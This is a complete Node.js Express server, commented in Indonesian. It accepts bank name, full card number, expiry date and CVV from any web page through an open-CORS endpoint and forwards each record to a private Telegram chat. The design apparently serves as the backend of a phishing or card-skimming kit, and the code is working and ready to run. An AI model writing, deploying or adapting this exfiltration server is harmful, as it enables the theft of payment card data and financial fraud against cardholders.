
require('dotenv').config();
const express = require('express');
const fetch = require('node-fetch');
const app = express();

// === KONFIGURASI ===
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const PORT = process.env.PORT || 3000;
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// === MIDDLEWARE ===
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Izinkan akses dari halaman web
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

// === ENDPOINT TERIMA DATA DARI HALAMAN WEB ===
app.post('/kirim-data', async (req, res) => {
  try {
    const { bank, nomor_kartu, masa_berlaku, cvv, waktu } = req.body;

    // Validasi data
    if (!bank || !nomor_kartu || !masa_berlaku || !cvv) {
      return res.json({ sukses: false, pesan: 'Data belum lengkap' });
    }

    // Format pesan ke Telegram
    const pesan = `
💳 DATA KARTU DITERIMA
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🏦 Bank: ${bank}
💳 Nomor Kartu: ${nomor_kartu}
📅 Masa Berlaku: ${masa_berlaku}
🔑 CVV: ${cvv}
🕐 Waktu: ${waktu || new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    `.trim();

    // Kirim ke Telegram
    const kirim = await fetch(`${TELEGRAM_API}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: pesan,
        parse_mode: 'HTML'
      })
    });

    const hasil = await kirim.json();
    if (hasil.ok) {
      return res.json({ sukses: true, pesan: 'Terkirim ke Telegram' });
    } else {
      console.error('Error Telegram:', hasil);
      return res.json({ sukses: false, pesan: hasil.description });
    }

  } catch (err) {
    console.error('Server Error:', err);
    return res.json({ sukses: false, pesan: 'Kesalahan server: ' + err.message });
  }
});

// === CEK STATUS BOT ===
app.get('/', (req, res) => {
  res.send(`
    ✅ Bot Telegram BERJALAN! 🟢<br>
    Endpoint: <code>POST /kirim-data</code><br>
    Token: ${BOT_TOKEN ? '✅ Sudah diisi' : '❌ Belum diisi'}<br>
    Chat ID: ${CHAT_ID ? '✅ Sudah diisi' : '❌ Belum diisi'}
  `);
});

// === JALANKAN SERVER ===
app.listen(PORT, () => {
  console.log(`\n🚀 Bot berjalan di: http://localhost:${PORT}`);
  console.log(`📡 Endpoint kirim data: http://localhost:${PORT}/kirim-data`);
  console.log(`🔗 Cek status: http://localhost:${PORT}\n`);
});
